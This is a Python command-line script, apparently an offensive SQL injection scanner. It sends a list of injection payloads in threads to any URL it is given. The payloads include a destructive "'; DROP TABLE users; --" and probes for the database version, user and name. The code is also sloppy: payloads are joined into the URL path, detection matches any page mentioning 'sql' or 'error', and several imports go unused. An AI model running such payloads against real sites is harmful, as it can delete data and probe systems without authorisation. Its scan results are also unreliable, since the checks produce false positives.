import requests
import logging
import threading
import shutil
import inspect
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='[%(asctime)s] - %(levelname)s - %(message)s',
                    handlers=[logging.StreamHandler()])

# List of SQLi payloads
payloads = [
    "' OR 1=1 --",         # Classic boolean-based SQLi
    "' OR 'a'='a' --",     # Another form of boolean-based SQLi
    "' UNION SELECT NULL, NULL --",  # Union-based SQLi
    "'; DROP TABLE users; --",  # Attempted SQL injection to delete table
    "'; SELECT version(); --", # Get database version
    "'; SELECT user(); --",   # Get current DB user
    "'; SELECT database(); --", # Get current DB name
]

# Thread worker for scanning a URL
def scan_url(url, payload):
    try:
        response = requests.get(url, params={'id': payload}, timeout=10)
        
        # Check for typical SQLi vulnerability responses
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            logging.warning(f"Potential SQLi vulnerability detected with payload: {payload} at {url}")
        elif "mysql" in response.text.lower() or "sql" in response.text.lower():
            logging.warning(f"Possible SQL injection vulnerability detected with payload: {payload} at {url}")
        else:
            logging.info(f"No immediate vulnerability found with payload: {payload} at {url}")
    except Exception as e:
        logging.error(f"Error scanning URL {url} with payload {payload}: {str(e)}")

# Function to handle the scanning logic
def start_scan(base_url):
    logging.info(f"Starting SQLi scan on: {base_url}")
    
    # For each URL, test with multiple payloads
    for payload in payloads:
        full_url = urljoin(base_url, payload)
        thread = threading.Thread(target=scan_url, args=(full_url, payload))
        thread.start()

# Main entry point
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Brute Force Scanner")
    parser.add_argument('-u', '--url', required=True, help='URL to scan for SQL injection')
    args = parser.parse_args()
    
    if not args.url:
        logging.error("URL is required. Use -u or --url to provide a URL.")
        exit(1)

    start_scan(args.url)
